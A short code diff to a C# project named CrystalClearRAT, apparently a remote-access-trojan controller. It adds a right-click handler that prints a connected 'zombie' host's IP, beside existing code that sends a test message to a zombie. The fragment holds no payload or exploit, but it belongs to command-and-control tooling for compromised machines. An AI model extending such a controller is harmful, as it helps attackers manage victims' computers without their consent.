@@ -45,5 +45,11 @@ namespace CrystalClearRAT
         {
             Server.Send(Encoding.UTF8.GetBytes("Hello Zombie"), Zombie.Zombies[0]);
         }
+
+        private void OnMouseRightButtonDown(object sender, MouseButtonEventArgs e)
+        {
+            var zombie = ((ListViewItem)sender).Content as Zombie;
+            Console.WriteLine(zombie.IP);
+        }
     }
 }
